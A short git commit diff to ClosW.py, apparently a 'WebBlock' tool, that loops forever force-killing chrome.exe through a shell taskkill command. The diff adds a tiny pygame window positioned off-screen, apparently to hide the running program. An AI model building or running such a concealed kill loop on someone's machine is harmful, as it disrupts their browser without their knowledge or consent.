c8c9c9e7a99f07ed1e6f815d0f5f0d2809f1f88a
WebBlock-Oss <person.extra.people@gmail.com>
2025-01-25 09:35:33 +1100

    Add files via upload
    Updated File

--- ClosW.py
+++ ClosW.py
@@ -1,4 +1,13 @@
 import subprocess
+import pygame
+import os
+
+x = -200
+y = 45
+os.environ['SDL_VIDEO_WINDOW_POS'] = "%d,%d" % (x, y)
+
+pygame.init()
+screen = pygame.display.set_mode((10, 10))
 
 while True:
     subprocess.call("taskkill /f /im chrome.exe", shell=True)
